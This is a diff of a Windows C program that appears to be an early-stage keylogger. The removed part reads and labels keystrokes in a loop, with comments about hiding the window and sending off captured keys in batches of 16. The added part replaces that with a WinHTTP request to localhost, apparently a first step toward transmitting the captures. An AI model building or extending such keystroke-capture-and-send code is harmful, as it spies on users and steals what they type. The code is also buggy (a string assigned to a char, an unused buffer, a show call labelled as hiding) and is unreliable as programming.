@@ -1,53 +1,67 @@
 #include <stdio.h>
 #include <Windows.h>
-#include <time.h>
+#include <Winhttp.h>
 
-int main(void) {
-	char key;
-	char capture[16]; // Send off keystrokes when we have 16 characters.
+#pragma comment(lib, "winhttp.lib")
+#define N 32
 
-	// Hide window
-	HWND window;
-	AllocConsole();
-	window = FindWindowA("ConsoleWindowClass", NULL);
-	ShowWindow(window, 1);
-
-	while (1) {
-		Sleep(20);
-		if (kbhit()) {
-			key = getch();
-			switch ((int)key) {
-
-			case ' ': 
-				printf(" ");
-				break;
-
-			case 0x09: 
-				printf("[TAB]");
-				break;
-
-			case 0x0D:
-				printf("[ENTER]");
-				break;
-
-			case 0x1B: 
-				printf("[ESC]");
-				break;
-
-			case 0x08:
-				printf("[BACKSPACE]");
-				break;
-
-			default:
-				printf("%c", key);
-				break;
-			}
-		}
+void printString(int capture[]) {
+	char string[N];
+	for (int i = 0; i < N - 1; i++) {
+		printf("%d ", capture[i]);
 	}
-
-	return 0;
 }
 
-int sendCapture(int capture) {
+int sendCapture(void) {
+	DWORD dwSize = 0;
+	DWORD dwDownloaded = 0;
+	LPSTR pszOutBuffer;
+	BOOL  bResults = FALSE;
+	HINTERNET  hSession = NULL,
+		hConnect = NULL,
+		hRequest = NULL;
 
+	char test = "a";
+
+    // Use WinHttpOpen to obtain a session handle.
+    hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0",
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS, 0);
+
+    // Specify an HTTP server.
+    if (hSession)
+        hConnect = WinHttpConnect(hSession, L"localhost",
+            INTERNET_DEFAULT_HTTP_PORT, 0);
+
+    // Create an HTTP Request handle.
+    if (hConnect)
+        hRequest = WinHttpOpenRequest(hConnect, L"GET",
+            NULL,
+            NULL, WINHTTP_NO_REFERER,
+            WINHTTP_DEFAULT_ACCEPT_TYPES,
+            0);
+
+    // Send a Request.
+    if (hRequest)
+        bResults = WinHttpSendRequest(hRequest,
+            WINHTTP_NO_ADDITIONAL_HEADERS,
+            0, WINHTTP_NO_REQUEST_DATA, 0,
+            0, 0);
+
+	if (!bResults)
+		printf("Error %d has occurred.\n", GetLastError());
+
+	// End the request.
+	if (hRequest) WinHttpCloseHandle(hRequest);
+	if (hConnect) WinHttpCloseHandle(hConnect);
+	if (hSession) WinHttpCloseHandle(hSession);
+
+	return 1;
+}
+
+int main(void) {
+	sendCapture();
+
+	return 1;
 }
